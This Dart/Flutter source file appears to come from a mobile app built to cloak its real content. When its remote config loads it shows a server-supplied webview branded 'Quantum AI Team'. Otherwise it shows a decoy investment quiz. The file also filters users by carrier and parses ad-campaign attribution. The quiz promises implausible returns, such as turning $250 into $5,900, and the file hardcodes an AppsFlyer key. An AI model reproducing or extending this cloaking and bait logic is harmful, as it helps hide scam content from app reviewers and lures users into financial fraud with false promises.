import 'dart:async';
import 'dart:convert';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:cgteam/root/blocs/app_events.dart';
import 'package:cgteam/root/core/app_config.dart';
import 'package:cgteam/root/core/helpers.dart';
import 'package:cgteam/root/models/app_config_model.dart';
import 'package:cgteam/root/models/appsflyer_data_model.dart';
import 'package:cgteam/root/models/carrier_model.dart';
import 'package:cgteam/root/models/config.dart';
import 'package:cgteam/root/models/tracker_config_model.dart';
import 'package:cgteam/root/repositories/app_repository/app_repository.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:hive/hive.dart';

import 'config_state.dart';

List questions = [
  {
    'image': 'assets/1.jpeg',
    "question": "Do you have experience in investing?",
    "answers": [
      "Yes, I am successfully investing to this day",
      "No, I never invested before"
    ]
  },
  {
    'image': 'assets/2.jpeg',
    "question": "What financial goals do you have?",
    "answers": [
      "Quit my job",
      "Start your own business",
      "Buy a house or other real estate",
      "Save enough money for a rainy day"
    ]
  },
  {
    'image': 'assets/3.jpeg',
    "question": "How much do you want to start investing with?",
    "msg": "",
    "answers": [
      "\$250 and make \$5,900",
      "\$500 and make \$11,800",
      "\$1,000 and make \$23,600",
    ]
  }
];

class ConfigBloc extends Bloc<ConfigEvent, ConfigState> {
  final AppRepository appRepository;

  ConfigBloc({required this.appRepository}) : super(InitialState()) {
    on<FetchEvent>((event, emit) async {
      try {
        ConfigAppModel configAppModel = await appRepository.fetchConfig();

        AppsFlyerOptions appsFlyerOptions = AppsFlyerOptions(
            afDevKey: "RWZ3UZeGvBqC5gtb6GFTrG",
            appId: "1640709304",
            showDebug: true,
            timeToWaitForATTUserAuthorization: 50, // for iOS 14.5
            disableAdvertisingIdentifier: false, // Optional field
            disableCollectASA: false); // Optional field

        AppsflyerSdk appsflyerSdk = AppsflyerSdk(appsFlyerOptions);

        appsflyerSdk
            .initSdk(
                registerConversionDataCallback: true,
                registerOnAppOpenAttributionCallback: true,
                registerOnDeepLinkingCallback: true)
            .then((value) => debugPrint(value));
        emit(BlackState(
            webView: configAppModel.source, appName: "Quantum AI Team"));
      } catch (ex) {
        emit(WhiteState(appName: AppConfig.APP_TITLE, questions: questions));
      }
    });
  }

  String getBuyer({required String campaing}) {
    try {
      return campaing.split('_')[0];
    } catch (ex) {
      return campaing;
    }
  }

  Future<bool> geoChecker(List<String> geo) async {
    CarrierModel carrierModel = await appRepository.getCarrier();
    print(carrierModel.carrierInfo);
    return geo.contains("all")
        ? true
        : geo.contains(carrierModel.carrierInfo.toLowerCase());
  }

  Future<String> getCarrier() async {
    CarrierModel carrierModel = await appRepository.getCarrier();
    print(carrierModel.carrierInfo);
    return carrierModel.carrierInfo;
  }

  Future<void> initOneSignal(String oneSignalId, bool showSubscription) async {
    // OneSignal.Debug.setLogLevel(OSLogLevel.verbose);
    //
    // OneSignal.initialize(oneSignalId);
  }

  Future<dynamic> initTracker(TrackerConfigModel trackerConfigModel,
      AppConfigModel appConfigModel, String package) async {
    switch (trackerConfigModel.name) {
      case 'appsflyer':
        print("APPSFLYER");
        print(trackerConfigModel.appToken);
        AppsFlyerCustomData appsflyer =
            await initAppsflyer(trackerConfigModel, package);
        var finalAttributionData;
        if (Hive.box("attrdata").isEmpty) {
          finalAttributionData =
              finalAttrData(appsflyer.onInstallConversionData);
          Helpers.setString("apf_raw_data",
              Uri.encodeFull(jsonEncode(appsflyer.onInstallConversionData)));

          Hive.box("attrdata").add(finalAttributionData);
        } else {
          finalAttributionData = Hive.box("attrdata").get(0);
        }
        return appsflyer;
    }
  }

  Future<AppsFlyerCustomData> initAppsflyer(
      TrackerConfigModel trackerConfigModel, String package) async {
    Map appsFlyerOptions = {
      "afDevKey": trackerConfigModel.appToken,
      "afAppId": AppConfig.appId,
      "isDebug": true
    };

    AppsflyerSdk appsflyerSdk = AppsflyerSdk(appsFlyerOptions);
    Helpers.setString("appsflyer_event", trackerConfigModel.inappEvent);

    final completer = Completer<Map<dynamic, dynamic>>();
    String? appsFlyerUID;

    await appsflyerSdk
        .initSdk(
          registerConversionDataCallback: true,
          registerOnAppOpenAttributionCallback: true,
          // registerOnDeepLinkingCallback: true
        )
        .then((value) => {
              print("CURRENT THEN ${value}"),
              if (Hive.box("attrdata").isEmpty)
                {
                  appsflyerSdk.onInstallConversionData((res) {
                    print("onInstallConversionData ${res.toString()}");
                    completer.complete(res);
                  })
                }
              else
                {
                  completer.complete({'onInstallConversionData': 'null'})
                }
            })
        .then((value) async =>
            {appsFlyerUID = await appsflyerSdk.getAppsFlyerUID()});
    Helpers.setString("appsflyer_uid", appsFlyerUID);
    AppsFlyerCustomData appsFlyerCustomData = AppsFlyerCustomData(
        appsFlyerUID: appsFlyerUID,
        appsflyerSdk: appsflyerSdk,
        onInstallConversionData: await completer.future);
    return appsFlyerCustomData;
  }

  String finalAttrData(data) {
    Helpers.setString("appsflyer_all", jsonEncode(data));

    var finalAttributionData = data["status"] != 'failure'
        ? {
            "it": data["payload"]["install_time"].toString(),
            "ifl": data["payload"]["is_first_launch"],
            "af_m": data["payload"]["af_message"],
            "af_status": data["payload"]["af_status"],
            "media_source": data["payload"]["media_source"] != null
                ? data["payload"]["media_source"]
                : 'null',
            "campaign": data["payload"]["campaign"] != null
                ? data["payload"]["campaign"]
                : 'null',
            "campaign_id": data["payload"]["campaign_id"] != null
                ? data["payload"]["campaign_id"]
                : 'null',
            "network": data["payload"]["network"] != null
                ? data["payload"]["network"]
                : 'null',
            "af_keywords": data["payload"]["af_keywords"] != null
                ? data["payload"]["af_keywords"]
                : 'null',
            "adgroup": data["payload"]["adgroup"] != null
                ? data["payload"]["adgroup"]
                : 'null',
            "adgroup_id": data["payload"]["adgroup_id"] != null
                ? data["payload"]["adgroup_id"]
                : 'null',
            "adset": data["payload"]["adset"] != null
                ? data["payload"]["adset"]
                : 'null',
            "af_channel": data["payload"]["af_channel"] != null
                ? data["payload"]["af_channel"]
                : 'null',
          }
        : data;
    return jsonEncode(finalAttributionData);
  }

  Future<void> onOfferClick() async {
    await appRepository.onOfferClick();
  }

  int getId(String str) {
    final regex = RegExp(r'\(([^()]*)\)');
    final match = regex.firstMatch(str);
    final everything = match?.group(0) ?? 0;

    return int.parse(everything.toString().replaceAll(new RegExp(r"\D"), ""));
  }

  Future<void> getIDFACOllect() async {
    // If the system can show an authorization request dialog
    if (await AppTrackingTransparency.trackingAuthorizationStatus ==
        TrackingStatus.notDetermined) {
      // Show a custom explainer dialog before the system dialog
      // Request system's tracking authorization dialog
      await AppTrackingTransparency.requestTrackingAuthorization();
    }
  }
}
